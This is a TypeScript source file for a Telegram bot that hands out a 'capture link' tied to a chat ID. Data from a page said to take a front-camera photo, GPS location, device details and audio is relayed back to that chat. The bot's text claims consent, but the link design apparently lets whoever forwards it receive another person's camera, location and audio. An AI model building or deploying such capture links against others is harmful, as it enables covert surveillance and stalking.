import TelegramBot from "node-telegram-bot-api";
import { logger } from "./logger";

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) throw new Error("TELEGRAM_BOT_TOKEN environment variable is required");

// Webhook mode when APP_URL is set (production/Render), polling for local dev
const appUrl = process.env.APP_URL?.replace(/\/$/, "");
const useWebhook = !!appUrl;

export const bot = useWebhook
  ? new TelegramBot(token, { polling: false })
  : new TelegramBot(token, { polling: true });

if (useWebhook) {
  const webhookUrl = `${appUrl}/api/telegram-webhook`;
  bot.setWebHook(webhookUrl).then(() => {
    logger.info({ webhookUrl }, "Telegram webhook set");
  }).catch((err: unknown) => {
    logger.error({ err }, "Failed to set Telegram webhook");
  });
} else {
  logger.info("Telegram bot started in polling mode (dev)");
}

// Build the capture link for users
function getCaptureLink(chatId: number): string {
  const base = appUrl || (process.env.REPLIT_DEV_DOMAIN
    ? `https://${process.env.REPLIT_DEV_DOMAIN}`
    : process.env.REPLIT_DOMAINS
      ? `https://${process.env.REPLIT_DOMAINS.split(",")[0]}`
      : "http://localhost:80");
  return `${base}/?chat_id=${chatId}`;
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const firstName = msg.from?.first_name ?? "User";
  const link = getCaptureLink(chatId);

  const text =
    `Hello ${firstName}! 👋\n\n` +
    `Click the link below to open the data sharing page.\n\n` +
    `The page will clearly show you what information will be shared:\n` +
    `• 📸 A photo from your front camera\n` +
    `• 📍 Your GPS location\n` +
    `• 📱 Your device information\n` +
    `• 🎤 Audio recording (while page is open)\n\n` +
    `🔗 ${link}\n\n` +
    `After you allow permissions, all data will be sent directly to this bot.`;

  bot.sendMessage(chatId, text).catch((err: unknown) => {
    logger.error({ err, chatId }, "Failed to send start message");
  });

  logger.info({ chatId, firstName }, "/start received");
});

bot.on("polling_error", (err) => {
  logger.error({ err }, "Telegram polling error");
});

export async function sendTextToChat(chatId: string, text: string): Promise<void> {
  await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
}

export async function sendPhotoToChat(
  chatId: string,
  photoBase64: string,
  caption?: string,
): Promise<void> {
  const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, "");
  const buffer = Buffer.from(base64Data, "base64");
  await bot.sendPhoto(chatId, buffer, { caption });
}

export async function sendAudioToChat(
  chatId: string,
  audioBuffer: Buffer,
  filename: string,
  caption?: string,
): Promise<void> {
  // Try sendVoice first (shows playable voice message), fallback to document
  try {
    await bot.sendVoice(chatId, audioBuffer, { caption });
  } catch {
    await bot.sendDocument(chatId, audioBuffer, { caption }, { filename, contentType: "audio/webm" });
  }
}
